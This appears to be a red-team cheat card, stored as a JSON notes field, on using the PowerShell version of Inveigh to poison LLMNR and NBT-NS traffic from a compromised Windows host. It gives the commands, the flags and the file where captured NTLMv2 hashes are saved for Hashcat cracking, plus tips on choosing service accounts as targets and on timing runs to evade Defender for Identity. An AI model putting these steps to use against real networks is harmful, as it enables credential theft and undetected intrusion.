      "notes": "=== WHY INVEIGH EXISTS ===\nLLMNR/NBT-NS poisoning requires L2 access (same subnet as victims). If you land\non a Windows host via phishing, RCE, or credential reuse, you can't run Linux\nResponder. Inveigh is the Windows-native equivalent — pure PowerShell (or C#),\nno additional binaries needed beyond the script.\n\n=== POWERSHELL VERSION (this card) vs C# VERSION ===\n  Invoke-Inveigh (PS)  → older, deprecated, but runs anywhere PS is available\n  Inveigh.exe (C#)     → active development, interactive console, preferred choice\n  Use PS version when: .exe execution is blocked but PS isn't, or you're on an\n  old system without the .exe available.\n\n=== IMPORT AND RUN ===\n  Import-Module .\\Inveigh.ps1\n  Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n\nFlags:\n  Y (first)         → enable LLMNR poisoning\n  -NBNS Y           → also poison NBT-NS (broader coverage)\n  -ConsoleOutput Y  → print captures to console in real time\n  -FileOutput Y     → save to Inveigh-NTLMv2.txt in current dir\n\n=== WHAT TO LOOK FOR ===\n  NTLMV2 captured for [user] from [IP]\nLook for: domain user accounts, service accounts (svc-*, sql-*, backup-*)\nMachine accounts (HOSTNAME$) are low value — rarely crack.\n\n=== OUTPUT FILES ===\n  Inveigh-Log.txt      → event log\n  Inveigh-NTLMv2.txt  → captured hashes (ready for Hashcat -m 5600)\n\n=== OPSEC ===\nLoud — LLMNR responses from a non-DC are suspicious. Security tools (MDI,\nDefender for Identity) flag this behavior. Run during business hours briefly\nto blend with legitimate authentication noise rather than all day.",
